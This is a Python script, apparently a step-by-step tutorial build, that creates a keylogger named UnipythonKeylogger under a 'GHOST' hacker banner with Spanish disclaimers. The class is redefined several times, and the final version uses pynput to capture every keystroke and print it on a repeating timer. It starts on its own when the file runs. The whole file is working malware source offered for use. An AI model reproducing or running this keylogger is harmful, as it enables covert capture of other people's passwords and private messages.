print(" ___________________________________________________________________________________________")
print("|    ******          ******", "      ", "******          ******", "     ", "******          ******","    ","|")
print("|    *....*          *....*", "      ", "*....*          *....*", "     ", "*....*          *....*","    ","|")
print("| // *....*          *....*", "   // ", "*....*          *....*", "  // ", "*....*          *....*"," // ","|")
print("|//  *....*          *....*", "  //  ", "*....*          *....*", " //  ", "*....*          *....*","// ","|")
print("|    *....*          *....*", "      ", "*....*          *....*", "     ", "*....*          *....*","    ","|")
print("|    *....*          *....*", "      ", "*....*    **    *....*", "     ", "*....*          *....*","    ","|")
print("|    *....*          *....*", "      ", "*....**  *  *  **....*", "     ", "*....*          *....*","    ","|")
print("|    *....************....*", "      ", "*......**    **......*", "     ", "*....************....*","    ","|")
print("|    *....................*", "      ", "*.....**      **.....*", "     ", "*....................*","    ","|")
print("|    **********************", "      ", "*****            *****", "     ", "**********************","    ","|")
print("|              ", "ESTA HERRAMIENTA QUEDA EN RESPONSABILIDAD DE QUIEN LA UTILIZA", "             ","|")
print("| /\    ", "--------------------------------------------------------------------------", "  /\   ","|")
print("| \/    ", "----------------------- Somos fantasmas en la red ------------------------", "  \/   ","|")
print("|       ", "-----------------------          GHOST            ------------------------", "       ","|")
print(" -------------------------------------------------------------------------------------------")


import pynput.keyboard
import threading

eventos = ""
class UnipythonKeylogger():
    pass

class UnipythonKeylogger():
    
    
    def tecla_usuario(tecla):
        pass
    
    def reporte(self):
        pass
    
    
    def iniciar(self):
        pass
class UnipythonKeylogger():
    def tecla_usuario(self, tecla):
        
        
        
        global eventos
        
        
        try:
            eventos = eventos + str(tecla.char)
        except:
            
            if tecla == tecla.space:
                eventos = eventos + " "
            
            else:
                eventos = eventos + " " + str(tecla) + " "
    def reporte(self):
        pass
    def iniciar(self):
        pass
class UnipythonKeylogger():
    def tecla_usuario(self, tecla):
        
        global eventos
        
        try:
            eventos = eventos + str(tecla.char)
        except:
            if tecla == tecla.space:
                eventos = eventos + " "
            else:
                eventos = eventos + " " + str(tecla) + " "
    def reporte(self):
        global eventos
        
        print(eventos)
        
        eventos = ""
        
        reporte = threading.Timer(5, self.reporte)
        
        reporte.start()
    def iniciar(self):
        pass
class UnipythonKeylogger():
    def tecla_usuario(self, tecla):
        
        global eventos
        
        try:
            eventos = eventos + str(tecla.char)
        except:
            if tecla == tecla.space:
                eventos = eventos + " "
            else:
                eventos = eventos + " " + str(tecla) + " "
    def reporte(self):
        global eventos
        
        print(eventos)
        
        eventos = ""
        
        reporte = threading.Timer(5, self.reporte)
        
        reporte.start()
    def iniciar(self):
        
        
        detector_teclas = pynput.keyboard.Listener(on_press=self.tecla_usuario)
        
       
        with detector_teclas:
            
            self.reporte()
            
            detector_teclas.join()
class UnipythonKeylogger():
    
    def __init__(self):
        self.iniciar()
    def tecla_usuario(self,tecla):
        
        global eventos
        
        try:
            eventos = eventos + str(tecla.char)
        except:
            if tecla == tecla.space:
                eventos = eventos + " "
            else:
                eventos = eventos + " " + str(tecla) + " "
    def reporte(self):
        global eventos
        print(eventos)
        eventos = ""
        reporte = threading.Timer(10, self.reporte)
        reporte.start()
    def iniciar(self):
        
        detector_teclas = pynput.keyboard.Listener(on_press=self.tecla_usuario)
        
        with detector_teclas:
            
            self.reporte()
            detector_teclas.join()

keylogger = UnipythonKeylogger()
